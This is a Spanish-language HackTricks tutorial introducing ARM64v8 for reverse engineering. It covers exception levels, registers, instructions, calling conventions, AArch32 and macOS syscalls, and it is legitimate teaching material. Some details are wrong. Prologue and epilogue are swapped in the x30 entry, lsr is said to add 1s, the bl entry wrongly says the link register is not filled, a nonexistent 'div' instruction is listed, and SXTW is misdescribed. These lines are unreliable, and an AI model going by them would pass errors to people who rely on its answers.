# Introducción a ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Niveles de Excepción - EL (ARM64v8)**

En la arquitectura ARMv8, los niveles de ejecución, conocidos como Niveles de Excepción (ELs), definen el nivel de privilegio y las capacidades del entorno de ejecución. Hay cuatro niveles de excepción, que van de EL0 a EL3, cada uno con un propósito diferente:

1. **EL0 - Modo Usuario**:
- Este es el nivel menos privilegiado y se utiliza para ejecutar código de aplicación regular.
- Las aplicaciones que se ejecutan en EL0 están aisladas entre sí y del software del sistema, mejorando la seguridad y la estabilidad.
2. **EL1 - Modo Núcleo del Sistema Operativo**:
- La mayoría de los núcleos de sistemas operativos se ejecutan en este nivel.
- EL1 tiene más privilegios que EL0 y puede acceder a recursos del sistema, pero con algunas restricciones para garantizar la integridad del sistema.
3. **EL2 - Modo Hipervisor**:
- Este nivel se utiliza para la virtualización. Un hipervisor que se ejecuta en EL2 puede gestionar múltiples sistemas operativos (cada uno en su propio EL1) que se ejecutan en el mismo hardware físico.
- EL2 proporciona características para el aislamiento y control de los entornos virtualizados.
4. **EL3 - Modo Monitor Seguro**:
- Este es el nivel más privilegiado y se utiliza a menudo para el arranque seguro y entornos de ejecución confiables.
- EL3 puede gestionar y controlar accesos entre estados seguros y no seguros (como arranque seguro, OS confiable, etc.).

El uso de estos niveles permite una forma estructurada y segura de gestionar diferentes aspectos del sistema, desde aplicaciones de usuario hasta el software del sistema más privilegiado. El enfoque de ARMv8 sobre los niveles de privilegio ayuda a aislar efectivamente diferentes componentes del sistema, mejorando así la seguridad y robustez del sistema.

## **Registros (ARM64v8)**

ARM64 tiene **31 registros de propósito general**, etiquetados de `x0` a `x30`. Cada uno puede almacenar un valor de **64 bits** (8 bytes). Para operaciones que requieren solo valores de 32 bits, los mismos registros se pueden acceder en un modo de 32 bits usando los nombres w0 a w30.

1. **`x0`** a **`x7`** - Estos se utilizan típicamente como registros temporales y para pasar parámetros a subrutinas.
- **`x0`** también lleva los datos de retorno de una función.
2. **`x8`** - En el núcleo de Linux, `x8` se utiliza como el número de llamada al sistema para la instrucción `svc`. **¡En macOS, el que se usa es x16!**
3. **`x9`** a **`x15`** - Más registros temporales, a menudo utilizados para variables locales.
4. **`x16`** y **`x17`** - **Registros de Llamada Intra-procedimental**. Registros temporales para valores inmediatos. También se utilizan para llamadas a funciones indirectas y stubs de PLT (Tabla de Enlace de Procedimientos).
- **`x16`** se utiliza como el **número de llamada al sistema** para la instrucción **`svc`** en **macOS**.
5. **`x18`** - **Registro de Plataforma**. Puede ser utilizado como un registro de propósito general, pero en algunas plataformas, este registro está reservado para usos específicos de la plataforma: Puntero al bloque de entorno de hilo local en Windows, o para apuntar a la **estructura de tarea actualmente ejecutándose en el núcleo de Linux**.
6. **`x19`** a **`x28`** - Estos son registros guardados por el llamado. Una función debe preservar los valores de estos registros para su llamador, por lo que se almacenan en la pila y se recuperan antes de volver al llamador.
7. **`x29`** - **Puntero de Marco** para hacer un seguimiento del marco de la pila. Cuando se crea un nuevo marco de pila porque se llama a una función, el registro **`x29`** se **almacena en la pila** y la dirección del **nuevo** puntero de marco (dirección **`sp`**) se **almacena en este registro**.
- Este registro también puede ser utilizado como un **registro de propósito general**, aunque generalmente se usa como referencia a **variables locales**.
8. **`x30`** o **`lr`** - **Registro de Enlace**. Contiene la **dirección de retorno** cuando se ejecuta una instrucción `BL` (Branch with Link) o `BLR` (Branch with Link to Register) almacenando el valor de **`pc`** en este registro.
- También podría ser utilizado como cualquier otro registro.
- Si la función actual va a llamar a una nueva función y, por lo tanto, sobrescribir `lr`, lo almacenará en la pila al principio, este es el epílogo (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Almacenar `fp` y `lr`, generar espacio y obtener nuevo `fp`) y lo recuperará al final, este es el prólogo (`ldp x29, x30, [sp], #48; ret` -> Recuperar `fp` y `lr` y retornar).
9. **`sp`** - **Puntero de Pila**, utilizado para hacer un seguimiento de la parte superior de la pila.
- El valor de **`sp`** siempre debe mantenerse con al menos una **alineación de cuádruple palabra** o puede ocurrir una excepción de alineación.
10. **`pc`** - **Contador de Programa**, que apunta a la siguiente instrucción. Este registro solo puede ser actualizado a través de generaciones de excepciones, retornos de excepciones y saltos. Las únicas instrucciones ordinarias que pueden leer este registro son las instrucciones de salto con enlace (BL, BLR) para almacenar la dirección **`pc`** en **`lr`** (Registro de Enlace).
11. **`xzr`** - **Registro Cero**. También se llama **`wzr`** en su forma de registro de **32** bits. Puede ser utilizado para obtener fácilmente el valor cero (operación común) o para realizar comparaciones usando **`subs`** como **`subs XZR, Xn, #10`** almacenando los datos resultantes en ningún lado (en **`xzr`**).

Los registros **`Wn`** son la versión de **32 bits** del registro **`Xn`**.

### Registros SIMD y de Punto Flotante

Además, hay otros **32 registros de 128 bits** que pueden ser utilizados en operaciones optimizadas de múltiples datos de instrucción única (SIMD) y para realizar aritmética de punto flotante. Estos se llaman registros Vn, aunque también pueden operar en **64** bits, **32** bits, **16** bits y **8** bits y entonces se llaman **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** y **`Bn`**.

### Registros del Sistema

**Hay cientos de registros del sistema**, también llamados registros de propósito especial (SPRs), que se utilizan para **monitorear** y **controlar** el comportamiento de los **procesadores**.\
Solo se pueden leer o establecer utilizando las instrucciones especiales dedicadas **`mrs`** y **`msr`**.

Los registros especiales **`TPIDR_EL0`** y **`TPIDDR_EL0`** se encuentran comúnmente al realizar ingeniería inversa. El sufijo `EL0` indica la **excepción mínima** desde la cual se puede acceder al registro (en este caso, EL0 es el nivel de excepción (privilegio) regular con el que se ejecutan los programas regulares).\
A menudo se utilizan para almacenar la **dirección base de la región de almacenamiento local de hilos** en memoria. Por lo general, el primero es legible y escribible para programas que se ejecutan en EL0, pero el segundo se puede leer desde EL0 y escribir desde EL1 (como el núcleo).

- `mrs x0, TPIDR_EL0 ; Leer TPIDR_EL0 en x0`
- `msr TPIDR_EL0, X0 ; Escribir x0 en TPIDR_EL0`

### **PSTATE**

**PSTATE** contiene varios componentes del proceso serializados en el registro especial visible para el sistema operativo **`SPSR_ELx`**, siendo X el **nivel de permiso** **del** excepción desencadenada (esto permite recuperar el estado del proceso cuando la excepción termina).\
Estos son los campos accesibles:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Las **banderas de condición `N`**, `Z`, `C` y `V`:
- **`N`** significa que la operación produjo un resultado negativo.
- **`Z`** significa que la operación produjo cero.
- **`C`** significa que la operación llevó.
- **`V`** significa que la operación produjo un desbordamiento con signo:
- La suma de dos números positivos produce un resultado negativo.
- La suma de dos números negativos produce un resultado positivo.
- En la resta, cuando se resta un número negativo grande de un número positivo más pequeño (o viceversa), y el resultado no puede ser representado dentro del rango del tamaño de bits dado.
- Obviamente, el procesador no sabe si la operación es con signo o no, por lo que verificará C y V en las operaciones e indicará si ocurrió un acarreo en caso de que fuera con signo o sin signo.

> [!WARNING]
> No todas las instrucciones actualizan estas banderas. Algunas como **`CMP`** o **`TST`** lo hacen, y otras que tienen un sufijo s como **`ADDS`** también lo hacen.

- La **bandera de ancho de registro actual (`nRW`)**: Si la bandera tiene el valor 0, el programa se ejecutará en el estado de ejecución AArch64 una vez reanudado.
- El **Nivel de Excepción** (**`EL`**): Un programa regular que se ejecuta en EL0 tendrá el valor 0.
- La **bandera de paso único** (**`SS`**): Utilizada por depuradores para realizar un paso único configurando la bandera SS a 1 dentro de **`SPSR_ELx`** a través de una excepción. El programa ejecutará un paso y emitirá una excepción de paso único.
- La **bandera de estado de excepción ilegal** (**`IL`**): Se utiliza para marcar cuando un software privilegiado realiza una transferencia de nivel de excepción inválida, esta bandera se establece en 1 y el procesador desencadena una excepción de estado ilegal.
- Las **banderas `DAIF`**: Estas banderas permiten a un programa privilegiado enmascarar selectivamente ciertas excepciones externas.
- Si **`A`** es 1, significa que se desencadenarán **abortos asíncronos**. La **`I`** configura la respuesta a las **Solicitudes de Interrupción de Hardware** (IRQ). y la F está relacionada con las **Solicitudes de Interrupción Rápida** (FIR).
- Las **banderas de selección de puntero de pila** (**`SPS`**): Los programas privilegiados que se ejecutan en EL1 y superiores pueden alternar entre usar su propio registro de puntero de pila y el de modelo de usuario (por ejemplo, entre `SP_EL1` y `EL0`). Este cambio se realiza escribiendo en el registro especial **`SPSel`**. Esto no se puede hacer desde EL0.

## **Convención de Llamadas (ARM64v8)**

La convención de llamadas ARM64 especifica que los **primeros ocho parámetros** a una función se pasan en los registros **`x0` a `x7`**. Los **parámetros adicionales** se pasan en la **pila**. El **valor de retorno** se pasa de vuelta en el registro **`x0`**, o en **`x1`** también **si tiene 128 bits de largo**. Los registros **`x19`** a **`x30`** y **`sp`** deben ser **preservados** a través de las llamadas a funciones.

Al leer una función en ensamblador, busque el **prólogo y epílogo de la función**. El **prólogo** generalmente implica **guardar el puntero de marco (`x29`)**, **configurar** un **nuevo puntero de marco**, y **asignar espacio en la pila**. El **epílogo** generalmente implica **restaurar el puntero de marco guardado** y **retornar** de la función.

### Convención de Llamadas en Swift

Swift tiene su propia **convención de llamadas** que se puede encontrar en [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Instrucciones Comunes (ARM64v8)**

Las instrucciones ARM64 generalmente tienen el **formato `opcode dst, src1, src2`**, donde **`opcode`** es la **operación** a realizar (como `add`, `sub`, `mov`, etc.), **`dst`** es el **registro de destino** donde se almacenará el resultado, y **`src1`** y **`src2`** son los **registros de origen**. También se pueden usar valores inmediatos en lugar de registros de origen.

- **`mov`**: **Mover** un valor de un **registro** a otro.
- Ejemplo: `mov x0, x1` — Esto mueve el valor de `x1` a `x0`.
- **`ldr`**: **Cargar** un valor de **memoria** en un **registro**.
- Ejemplo: `ldr x0, [x1]` — Esto carga un valor de la ubicación de memoria apuntada por `x1` en `x0`.
- **Modo de desplazamiento**: Se indica un desplazamiento que afecta al puntero de origen, por ejemplo:
- `ldr x2, [x1, #8]`, esto cargará en x2 el valor de x1 + 8.
- `ldr x2, [x0, x1, lsl #2]`, esto cargará en x2 un objeto del array x0, desde la posición x1 (índice) \* 4.
- **Modo pre-indexado**: Esto aplicará cálculos al origen, obtendrá el resultado y también almacenará el nuevo origen en el origen.
- `ldr x2, [x1, #8]!`, esto cargará `x1 + 8` en `x2` y almacenará en x1 el resultado de `x1 + 8`.
- `str lr, [sp, #-4]!`, Almacena el registro de enlace en sp y actualiza el registro sp.
- **Modo post-indexado**: Esto es como el anterior, pero se accede a la dirección de memoria y luego se calcula y almacena el desplazamiento.
- `ldr x0, [x1], #8`, carga `x1` en `x0` y actualiza x1 con `x1 + 8`.
- **Dirección relativa al PC**: En este caso, la dirección a cargar se calcula en relación con el registro PC.
- `ldr x1, =_start`, Esto cargará la dirección donde comienza el símbolo `_start` en x1 relacionado con el PC actual.
- **`str`**: **Almacenar** un valor de un **registro** en **memoria**.
- Ejemplo: `str x0, [x1]` — Esto almacena el valor en `x0` en la ubicación de memoria apuntada por `x1`.
- **`ldp`**: **Cargar Par de Registros**. Esta instrucción **carga dos registros** desde **ubicaciones de memoria** consecutivas. La dirección de memoria se forma típicamente sumando un desplazamiento al valor en otro registro.
- Ejemplo: `ldp x0, x1, [x2]` — Esto carga `x0` y `x1` desde las ubicaciones de memoria en `x2` y `x2 + 8`, respectivamente.
- **`stp`**: **Almacenar Par de Registros**. Esta instrucción **almacena dos registros** en **ubicaciones de memoria** consecutivas. La dirección de memoria se forma típicamente sumando un desplazamiento al valor en otro registro.
- Ejemplo: `stp x0, x1, [sp]` — Esto almacena `x0` y `x1` en las ubicaciones de memoria en `sp` y `sp + 8`, respectivamente.
- `stp x0, x1, [sp, #16]!` — Esto almacena `x0` y `x1` en las ubicaciones de memoria en `sp+16` y `sp + 24`, respectivamente, y actualiza `sp` con `sp+16`.
- **`add`**: **Sumar** los valores de dos registros y almacenar el resultado en un registro.
- Sintaxis: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destino
- Xn2 -> Operando 1
- Xn3 | #imm -> Operando 2 (registro o inmediato)
- \[shift #N | RRX] -> Realizar un desplazamiento o llamar a RRX.
- Ejemplo: `add x0, x1, x2` — Esto suma los valores en `x1` y `x2` y almacena el resultado en `x0`.
- `add x5, x5, #1, lsl #12` — Esto equivale a 4096 (un 1 desplazado 12 veces) -> 1 0000 0000 0000 0000.
- **`adds`** Esto realiza un `add` y actualiza las banderas.
- **`sub`**: **Restar** los valores de dos registros y almacenar el resultado en un registro.
- Verifique la **sintaxis de `add`**.
- Ejemplo: `sub x0, x1, x2` — Esto resta el valor en `x2` de `x1` y almacena el resultado en `x0`.
- **`subs`** Esto es como sub pero actualizando la bandera.
- **`mul`**: **Multiplicar** los valores de **dos registros** y almacenar el resultado en un registro.
- Ejemplo: `mul x0, x1, x2` — Esto multiplica los valores en `x1` y `x2` y almacena el resultado en `x0`.
- **`div`**: **Dividir** el valor de un registro por otro y almacenar el resultado en un registro.
- Ejemplo: `div x0, x1, x2` — Esto divide el valor en `x1` por `x2` y almacena el resultado en `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Desplazamiento lógico a la izquierda**: Agrega 0s desde el final moviendo los otros bits hacia adelante (multiplica por n veces 2).
- **Desplazamiento lógico a la derecha**: Agrega 1s al principio moviendo los otros bits hacia atrás (divide por n veces 2 en sin signo).
- **Desplazamiento aritmético a la derecha**: Como **`lsr`**, pero en lugar de agregar 0s, si el bit más significativo es un 1, se agregan 1s (divide por n veces 2 en con signo).
- **Rotar a la derecha**: Como **`lsr`** pero lo que se elimina de la derecha se agrega a la izquierda.
- **Rotar a la derecha con extensión**: Como **`ror`**, pero con la bandera de acarreo como el "bit más significativo". Así que la bandera de acarreo se mueve al bit 31 y el bit eliminado a la bandera de acarreo.
- **`bfm`**: **Movimiento de Campo de Bits**, estas operaciones **copian bits `0...n`** de un valor y los colocan en posiciones **`m..m+n`**. El **`#s`** especifica la **posición del bit más a la izquierda** y **`#r`** la **cantidad de rotación a la derecha**.
- Movimiento de campo de bits: `BFM Xd, Xn, #r`.
- Movimiento de campo de bits con signo: `SBFM Xd, Xn, #r, #s`.
- Movimiento de campo de bits sin signo: `UBFM Xd, Xn, #r, #s`.
- **Extracción e Inserción de Campo de Bits:** Copia un campo de bits de un registro y lo copia a otro registro.
- **`BFI X1, X2, #3, #4`** Inserta 4 bits de X2 desde el tercer bit de X1.
- **`BFXIL X1, X2, #3, #4`** Extrae desde el tercer bit de X2 cuatro bits y los copia a X1.
- **`SBFIZ X1, X2, #3, #4`** Extiende el signo de 4 bits de X2 e inserta en X1 comenzando en la posición de bit 3, poniendo a cero los bits de la derecha.
- **`SBFX X1, X2, #3, #4`** Extrae 4 bits comenzando en el bit 3 de X2, extiende el signo y coloca el resultado en X1.
- **`UBFIZ X1, X2, #3, #4`** Extiende a cero 4 bits de X2 e inserta en X1 comenzando en la posición de bit 3, poniendo a cero los bits de la derecha.
- **`UBFX X1, X2, #3, #4`** Extrae 4 bits comenzando en el bit 3 de X2 y coloca el resultado extendido a cero en X1.
- **Extender Signo a X:** Extiende el signo (o simplemente agrega 0s en la versión sin signo) de un valor para poder realizar operaciones con él:
- **`SXTB X1, W2`** Extiende el signo de un byte **de W2 a X1** (`W2` es la mitad de `X2`) para llenar los 64 bits.
- **`SXTH X1, W2`** Extiende el signo de un número de 16 bits **de W2 a X1** para llenar los 64 bits.
- **`SXTW X1, W2`** Extiende el signo de un byte **de W2 a X1** para llenar los 64 bits.
- **`UXTB X1, W2`** Agrega 0s (sin signo) a un byte **de W2 a X1** para llenar los 64 bits.
- **`extr`:** Extrae bits de un **par de registros especificados concatenados**.
- Ejemplo: `EXTR W3, W2, W1, #3` Esto **concatena W1+W2** y obtiene **desde el bit 3 de W2 hasta el bit 3 de W1** y lo almacena en W3.
- **`cmp`**: **Comparar** dos registros y establecer banderas de condición. Es un **alias de `subs`** estableciendo el registro de destino en el registro cero. Útil para saber si `m == n`.
- Soporta la **misma sintaxis que `subs`**.
- Ejemplo: `cmp x0, x1` — Esto compara los valores en `x0` y `x1` y establece las banderas de condición en consecuencia.
- **`cmn`**: **Comparar el operando negativo**. En este caso, es un **alias de `adds`** y soporta la misma sintaxis. Útil para saber si `m == -n`.
- **`ccmp`**: Comparación condicional, es una comparación que se realizará solo si una comparación anterior fue verdadera y establecerá específicamente los bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> si x1 != x2 y x3 < x4, salta a func.
- Esto se debe a que **`ccmp`** solo se ejecutará si la **anterior `cmp` fue un `NE`**, si no lo fue, los bits `nzcv` se establecerán en 0 (lo que no satisfará la comparación `blt`).
- Esto también se puede usar como `ccmn` (lo mismo pero negativo, como `cmp` vs `cmn`).
- **`tst`**: Verifica si alguno de los valores de la comparación son ambos 1 (funciona como un AND sin almacenar el resultado en ningún lado). Es útil para verificar un registro con un valor y comprobar si alguno de los bits del registro indicado en el valor es 1.
- Ejemplo: `tst X1, #7` Verifica si alguno de los últimos 3 bits de X1 es 1.
- **`teq`**: Operación XOR descartando el resultado.
- **`b`**: Salto incondicional.
- Ejemplo: `b myFunction`.
- Tenga en cuenta que esto no llenará el registro de enlace con la dirección de retorno (no es adecuado para llamadas a subrutinas que necesitan regresar).
- **`bl`**: **Salto** con enlace, utilizado para **llamar** a una **subrutina**. Almacena la **dirección de retorno en `x30`**.
- Ejemplo: `bl myFunction` — Esto llama a la función `myFunction` y almacena la dirección de retorno en `x30`.
- Tenga en cuenta que esto no llenará el registro de enlace con la dirección de retorno (no es adecuado para llamadas a subrutinas que necesitan regresar).
- **`blr`**: **Salto** con enlace a registro, utilizado para **llamar** a una **subrutina** donde el objetivo está **especificado** en un **registro**. Almacena la dirección de retorno en `x30`.
- Ejemplo: `blr x1` — Esto llama a la función cuya dirección está contenida en `x1` y almacena la dirección de retorno en `x30`.
- **`ret`**: **Retornar** de **subrutina**, típicamente usando la dirección en **`x30`**.
- Ejemplo: `ret` — Esto retorna de la subrutina actual usando la dirección de retorno en `x30`.
- **`b.<cond>`**: Saltos condicionales.
- **`b.eq`**: **Salto si es igual**, basado en la instrucción `cmp` anterior.
- Ejemplo: `b.eq label` — Si la instrucción `cmp` anterior encontró dos valores iguales, esto salta a `label`.
- **`b.ne`**: **Salto si no es igual**. Esta instrucción verifica las banderas de condición (que fueron establecidas por una instrucción de comparación anterior), y si los valores comparados no eran iguales, salta a una etiqueta o dirección.
- Ejemplo: Después de una instrucción `cmp x0, x1`, `b.ne label` — Si los valores en `x0` y `x1` no eran iguales, esto salta a `label`.
- **`cbz`**: **Comparar y saltar si es cero**. Esta instrucción compara un registro con cero, y si son iguales, salta a una etiqueta o dirección.
- Ejemplo: `cbz x0, label` — Si el valor en `x0` es cero, esto salta a `label`.
- **`cbnz`**: **Comparar y saltar si no es cero**. Esta instrucción compara un registro con cero, y si no son iguales, salta a una etiqueta o dirección.
- Ejemplo: `cbnz x0, label` — Si el valor en `x0` no es cero, esto salta a `label`.
- **`tbnz`**: Prueba de bit y salto si no es cero.
- Ejemplo: `tbnz x0, #8, label`.
- **`tbz`**: Prueba de bit y salto si es cero.
- Ejemplo: `tbz x0, #8, label`.
- **Operaciones de selección condicional**: Estas son operaciones cuyo comportamiento varía dependiendo de los bits condicionales.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Si es verdadero, X0 = X1, si es falso, X0 = X2.
- `csinc Xd, Xn, Xm, cond` -> Si es verdadero, Xd = Xn, si es falso, Xd = Xm + 1.
- `cinc Xd, Xn, cond` -> Si es verdadero, Xd = Xn + 1, si es falso, Xd = Xn.
- `csinv Xd, Xn, Xm, cond` -> Si es verdadero, Xd = Xn, si es falso, Xd = NOT(Xm).
- `cinv Xd, Xn, cond` -> Si es verdadero, Xd = NOT(Xn), si es falso, Xd = Xn.
- `csneg Xd, Xn, Xm, cond` -> Si es verdadero, Xd = Xn, si es falso, Xd = - Xm.
- `cneg Xd, Xn, cond` -> Si es verdadero, Xd = - Xn, si es falso, Xd = Xn.
- `cset Xd, Xn, Xm, cond` -> Si es verdadero, Xd = 1, si es falso, Xd = 0.
- `csetm Xd, Xn, Xm, cond` -> Si es verdadero, Xd = \<todos 1>, si es falso, Xd = 0.
- **`adrp`**: Calcular la **dirección de página de un símbolo** y almacenarla en un registro.
- Ejemplo: `adrp x0, symbol` — Esto calcula la dirección de página de `symbol` y la almacena en `x0`.
- **`ldrsw`**: **Cargar** un valor **firmado de 32 bits** de la memoria y **extenderlo a 64** bits.
- Ejemplo: `ldrsw x0, [x1]` — Esto carga un valor firmado de 32 bits de la ubicación de memoria apuntada por `x1`, lo extiende a 64 bits y lo almacena en `x0`.
- **`stur`**: **Almacenar un valor de registro en una ubicación de memoria**, utilizando un desplazamiento de otro registro.
- Ejemplo: `stur x0, [x1, #4]` — Esto almacena el valor en `x0` en la dirección de memoria que es 4 bytes mayor que la dirección actualmente en `x1`.
- **`svc`** : Realizar una **llamada al sistema**. Significa "Supervisor Call". Cuando el procesador ejecuta esta instrucción, **cambia de modo usuario a modo núcleo** y salta a una ubicación específica en memoria donde se encuentra el **código de manejo de llamadas al sistema del núcleo**.

- Ejemplo:

```armasm
mov x8, 93  ; Cargar el número de llamada al sistema para salir (93) en el registro x8.
mov x0, 0   ; Cargar el código de estado de salida (0) en el registro x0.
svc 0       ; Realizar la llamada al sistema.
```

### **Prólogo de Función**

1. **Guardar el registro de enlace y el puntero de marco en la pila**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Configurar el nuevo puntero de marco**: `mov x29, sp` (configura el nuevo puntero de marco para la función actual)  
3. **Asignar espacio en la pila para variables locales** (si es necesario): `sub sp, sp, <size>` (donde `<size>` es el número de bytes necesarios)  

### **Epilogo de la Función**

1. **Desasignar variables locales (si se asignaron)**: `add sp, sp, <size>`  
2. **Restaurar el registro de enlace y el puntero de marco**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (devuelve el control al llamador utilizando la dirección en el registro de enlace)

## Estado de Ejecución AARCH32

Armv8-A soporta la ejecución de programas de 32 bits. **AArch32** puede ejecutarse en uno de **dos conjuntos de instrucciones**: **`A32`** y **`T32`** y puede cambiar entre ellos a través de **`interworking`**.\
Los programas **privilegiados** de 64 bits pueden programar la **ejecución de programas de 32 bits** al ejecutar una transferencia de nivel de excepción al de 32 bits de menor privilegio.\
Tenga en cuenta que la transición de 64 bits a 32 bits ocurre con una disminución del nivel de excepción (por ejemplo, un programa de 64 bits en EL1 activando un programa en EL0). Esto se hace configurando el **bit 4 de** **`SPSR_ELx`** registro especial **a 1** cuando el hilo de proceso `AArch32` está listo para ser ejecutado y el resto de `SPSR_ELx` almacena el CPSR de los programas **`AArch32`**. Luego, el proceso privilegiado llama a la instrucción **`ERET`** para que el procesador transicione a **`AArch32`** ingresando en A32 o T32 dependiendo de CPSR\*\*.\*\*

El **`interworking`** ocurre utilizando los bits J y T de CPSR. `J=0` y `T=0` significa **`A32`** y `J=0` y `T=1` significa **T32**. Esto se traduce básicamente en establecer el **bit más bajo a 1** para indicar que el conjunto de instrucciones es T32.\
Esto se establece durante las **instrucciones de rama de interworking**, pero también se puede establecer directamente con otras instrucciones cuando el PC se establece como el registro de destino. Ejemplo:

Otro ejemplo:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Registros

Hay 16 registros de 32 bits (r0-r15). **Desde r0 hasta r14** se pueden usar para **cualquier operación**, sin embargo, algunos de ellos suelen estar reservados:

- **`r15`**: Contador de programa (siempre). Contiene la dirección de la siguiente instrucción. En A32 actual + 8, en T32, actual + 4.
- **`r11`**: Puntero de marco
- **`r12`**: Registro de llamada intra-procedimental
- **`r13`**: Puntero de pila
- **`r14`**: Registro de enlace

Además, los registros se respaldan en **`registros bancados`**. Que son lugares que almacenan los valores de los registros permitiendo realizar **cambios de contexto rápidos** en el manejo de excepciones y operaciones privilegiadas para evitar la necesidad de guardar y restaurar manualmente los registros cada vez.\
Esto se hace **guardando el estado del procesador desde el `CPSR` al `SPSR`** del modo de procesador al que se toma la excepción. Al regresar de la excepción, el **`CPSR`** se restaura desde el **`SPSR`**.

### CPSR - Registro de Estado del Programa Actual

En AArch32, el CPSR funciona de manera similar a **`PSTATE`** en AArch64 y también se almacena en **`SPSR_ELx`** cuando se toma una excepción para restaurar más tarde la ejecución:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Los campos se dividen en algunos grupos:

- Registro de Estado del Programa de Aplicación (APSR): Banderas aritméticas y accesibles desde EL0
- Registros de Estado de Ejecución: Comportamiento del proceso (gestionado por el SO).

#### Registro de Estado del Programa de Aplicación (APSR)

- Las banderas **`N`**, **`Z`**, **`C`**, **`V`** (igual que en AArch64)
- La bandera **`Q`**: Se establece en 1 siempre que **ocurra saturación entera** durante la ejecución de una instrucción aritmética de saturación especializada. Una vez que se establece en **`1`**, mantendrá el valor hasta que se establezca manualmente en 0. Además, no hay ninguna instrucción que verifique su valor implícitamente, debe hacerse leyéndolo manualmente.
- Banderas **`GE`** (Mayor o igual): Se utilizan en operaciones SIMD (Instrucción Única, Múltiples Datos), como "suma paralela" y "resta paralela". Estas operaciones permiten procesar múltiples puntos de datos en una sola instrucción.

Por ejemplo, la instrucción **`UADD8`** **suma cuatro pares de bytes** (de dos operandos de 32 bits) en paralelo y almacena los resultados en un registro de 32 bits. Luego **establece las banderas `GE` en el `APSR`** basándose en estos resultados. Cada bandera GE corresponde a una de las sumas de bytes, indicando si la suma para ese par de bytes **desbordó**.

La instrucción **`SEL`** utiliza estas banderas GE para realizar acciones condicionales.

#### Registros de Estado de Ejecución

- Los bits **`J`** y **`T`**: **`J`** debe ser 0 y si **`T`** es 0 se utiliza el conjunto de instrucciones A32, y si es 1, se utiliza el T32.
- **Registro de Estado del Bloque IT** (`ITSTATE`): Estos son los bits del 10-15 y 25-26. Almacenan condiciones para instrucciones dentro de un grupo con prefijo **`IT`**.
- Bit **`E`**: Indica el **endianness**.
- Bits de Modo y Máscara de Excepción (0-4): Determinan el estado de ejecución actual. El **quinto** indica si el programa se ejecuta como 32 bits (un 1) o 64 bits (un 0). Los otros 4 representan el **modo de excepción actualmente en uso** (cuando ocurre una excepción y se está manejando). El número establecido **indica la prioridad actual** en caso de que se desencadene otra excepción mientras se está manejando esta.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: Ciertas excepciones pueden ser deshabilitadas usando los bits **`A`**, `I`, `F`. Si **`A`** es 1 significa que se desencadenarán **abortos asíncronos**. El **`I`** configura para responder a **Solicitudes de Interrupción** (IRQ) de hardware externo. y el F está relacionado con **Solicitudes de Interrupción Rápida** (FIR).

## macOS

### Llamadas del sistema BSD

Consulta [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Las llamadas del sistema BSD tendrán **x16 > 0**.

### Trampas de Mach

Consulta en [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) la `mach_trap_table` y en [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) los prototipos. El número máximo de trampas de Mach es `MACH_TRAP_TABLE_COUNT` = 128. Las trampas de Mach tendrán **x16 < 0**, así que necesitas llamar a los números de la lista anterior con un **menos**: **`_kernelrpc_mach_vm_allocate_trap`** es **`-10`**.

También puedes consultar **`libsystem_kernel.dylib`** en un desensamblador para encontrar cómo llamar a estas (y BSD) llamadas del sistema:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Nota que **Ida** y **Ghidra** también pueden descompilar **dylibs específicas** de la caché simplemente pasando la caché.

> [!TIP]
> A veces es más fácil revisar el código **descompilado** de **`libsystem_kernel.dylib`** **que** revisar el **código fuente** porque el código de varias syscalls (BSD y Mach) se genera a través de scripts (revisa los comentarios en el código fuente) mientras que en la dylib puedes encontrar lo que se está llamando.

### llamadas machdep

XNU soporta otro tipo de llamadas llamadas dependientes de la máquina. Los números de estas llamadas dependen de la arquitectura y ni las llamadas ni los números están garantizados para permanecer constantes.

### página comm

Esta es una página de memoria del propietario del kernel que está mapeada en el espacio de direcciones de cada proceso de usuario. Está destinada a hacer la transición del modo usuario al espacio del kernel más rápida que usar syscalls para servicios del kernel que se utilizan tanto que esta transición sería muy ineficiente.

Por ejemplo, la llamada `gettimeofdate` lee el valor de `timeval` directamente de la página comm.

### objc_msgSend

Es muy común encontrar esta función utilizada en programas de Objective-C o Swift. Esta función permite llamar a un método de un objeto de Objective-C.

Parámetros ([más información en la documentación](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Puntero a la instancia
- x1: op -> Selector del método
- x2... -> Resto de los argumentos del método invocado

Así que, si pones un breakpoint antes de la rama a esta función, puedes encontrar fácilmente lo que se invoca en lldb con (en este ejemplo el objeto llama a un objeto de `NSConcreteTask` que ejecutará un comando):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

